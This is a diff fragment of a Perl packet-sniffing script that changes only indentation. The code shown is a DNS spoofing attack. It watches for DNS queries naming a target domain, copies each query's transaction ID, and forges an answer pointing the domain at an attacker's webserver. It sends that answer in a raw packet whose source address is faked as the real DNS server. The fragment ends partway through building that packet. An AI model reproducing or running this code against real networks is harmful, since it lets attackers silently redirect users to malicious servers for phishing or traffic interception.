@@ -18,7 +18,7 @@ $webserver = $ARGV[1];
 sub process_pkt {
 	my ($user_data,$header,$packet) = @_;
 
-    $ip = NetPacket::IP->decode(eth_strip($packet));
+	$ip = NetPacket::IP->decode(eth_strip($packet));
    	$srcip = $ip->{src_ip}; 					# Source IP of the captured packet
    	$dstip = $ip->{dest_ip};					# Destination IP of the captured packet
 
@@ -27,19 +27,17 @@ sub process_pkt {
    	$dstport = $udp->{dest_port};					# Destination Port of the captured packet
 
    	if($dstport == 53) {						# Check that the packet is destined for a DNS server
-        $payload = $udp->{data};
+		$payload = $udp->{data};
 		$tid = unpack('n', substr($payload,0,2));		# Get the transaction ID from within the payload
 		$payload =~s/[\x00-\x1F]+/./g;				# Convert all non-printable characters to ASCII
 		if ($payload =~ /$target/) {				# Check the payload for our target domain      				       
-		    my $dns_response = Net::DNS::Packet->new($target, "A", "IN");
+			my $dns_response = Net::DNS::Packet->new($target, "A", "IN");
 			$dns_response->header->qr(1);
 			$dns_response->header->id($tid);
-        	$dns_response->push("pre", rr_add($target . ". 86400  A " . $webserver));
-
+			$dns_response->push("pre", rr_add($target . ". 86400  A " . $webserver));
 			my $dns_data = $dns_response->data;
-
 			my $udp_response = new Net::RawIP({
-               	ip=> {
+				ip=> {
 					saddr=>$dstip,			# Set the source address from the destination IP
 					daddr=>$srcip			# Set the destination address from the source IP
 				},
